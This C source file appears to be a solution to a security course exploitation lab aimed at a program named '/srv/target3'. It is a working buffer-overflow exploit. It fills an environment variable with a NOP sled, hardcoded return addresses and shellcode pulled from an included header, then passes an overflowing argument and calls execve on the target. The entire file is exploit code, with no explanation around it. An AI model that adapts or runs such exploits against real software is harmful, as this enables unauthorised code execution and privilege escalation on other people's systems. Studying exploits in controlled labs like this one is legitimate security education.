#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target3"
const size_t ENV_SIZE = 400;
const uintptr_t BASE_ADDRESS = 0xffffdec0;
const size_t NOP_SLED_SIZE = 201;
const uint8_t NOP = 0x90;
const size_t RET_ADDR_OFFSET = 4;

const uintptr_t START_ADDRESS = BASE_ADDRESS + RET_ADDR_OFFSET;
const uintptr_t SECOND_ADDRESS = BASE_ADDRESS + 2 * RET_ADDR_OFFSET;
const char PADDING[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xde\xff\xff";

void prepareEnvironment(char *environment) {
    memset(environment, NOP, ENV_SIZE - 1);
    *(uintptr_t *)(environment) = START_ADDRESS;
    *(uintptr_t *)(environment + RET_ADDR_OFFSET) = SECOND_ADDRESS;
    memcpy(environment + NOP_SLED_SIZE, shellcode, sizeof(shellcode));
    environment[ENV_SIZE - 1] = '\0';
}

int main(void) {
    char *arguments[] = {TARGET, PADDING, NULL};
    static char environment[ENV_SIZE];

    prepareEnvironment(environment);

    char *env[] = {environment};

    execve(TARGET, arguments, env);
    perror("execve failed");

    return 0;
}
